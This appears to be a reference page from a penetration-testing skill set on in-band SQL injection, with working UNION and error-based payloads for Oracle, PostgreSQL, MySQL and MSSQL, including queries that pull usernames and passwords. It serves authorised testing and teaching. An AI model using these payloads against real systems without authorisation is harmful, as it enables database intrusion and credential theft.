# In-band SQLi: UNION attacks and error-based extraction

Full detail behind SKILL.md section 3. Use these when the app reflects query output or a catchable DB error. From notes 02, 03, 04, 06, 13, 19.

## UNION attacks (output is reflected)
Requirements: the injected `SELECT` must have the **same number of columns** and **compatible types** as the original.

1. **Column count.** Either:
   - `' ORDER BY 1--`, `2--`, `3--` ... until "ORDER BY position number N is out of range", or
   - `' UNION SELECT NULL--`, `NULL,NULL--`, ... until no error (NULL casts to any type).
2. **Find a string column.** `' UNION SELECT 'a',NULL,NULL,NULL--`, then shift `'a'` across positions. An incompatible column errors ("Conversion failed... varchar value 'a' to data type int"); the right one echoes `a`.
3. **Read data.** `' UNION SELECT username, password FROM users--`. Discover names via `information_schema` (or Oracle `all_tables`/`all_tab_columns`).
4. **One reflected column?** Concatenate with a separator: Oracle/PG `username||'~'||password`, MySQL `CONCAT(username,'~',password)`, MSSQL `username+'~'+password`.

Real case (note 13): a UNION in a URL path, `/commenthistory/<id> union select 1,2,@@VERSION#`, echoed `10.1.32-MariaDB` in the reflected (3rd) column; swap `@@VERSION` for `current_user()`, then table data.

DBMS notes: Oracle needs `FROM dual` on every SELECT; MySQL `--` needs a trailing space (or use `#`).

## Error-based extraction
When output is not directly reflected but the app returns DB errors, make the error carry the data.

- **Visible-error leak via CAST** (PostgreSQL/general): `CAST((SELECT password FROM users LIMIT 1) AS int)` -> "invalid input syntax for integer: 'secret'". YesWeHack form: `?id=hoodie' AND 1=CAST((SELECT password FROM users) AS int)-- -` (note 06).
- **MSSQL conversion**: `SELECT 'foo' WHERE 1 = (SELECT 'secret')` -> "Conversion failed when converting the varchar value 'secret' to data type int".
- **MySQL EXTRACTVALUE/XPATH**: `AND EXTRACTVALUE(1, CONCAT(0x5c,(SELECT 'secret')))` -> "XPATH syntax error: '\secret'".
- **Conditional error (boolean via error)**: `' AND (SELECT CASE WHEN (cond) THEN 1/0 ELSE 'a' END)='a` triggers a divide-by-zero only if `cond` is true; use when there is no reflected output but errors change the response (note 03).

Error-based is the bridge from "blind" to "visible": a misconfigured verbose DB (note 19: "Unclosed quotation mark...") turns an otherwise blind injection into a readable one and maps the query.

## Choosing between them
- Output reflected and multi-column -> UNION (fastest, reads bulk data).
- No reflected output but verbose/unhandled errors -> error-based (CAST/EXTRACTVALUE) to leak values, or conditional errors to get a boolean oracle.
- Neither -> go blind/OOB (`blind-oob-and-second-order.md`).

## Minimal proof
Pull `@@version` / `current_user()` / one controlled row to prove impact; do not dump real user tables.
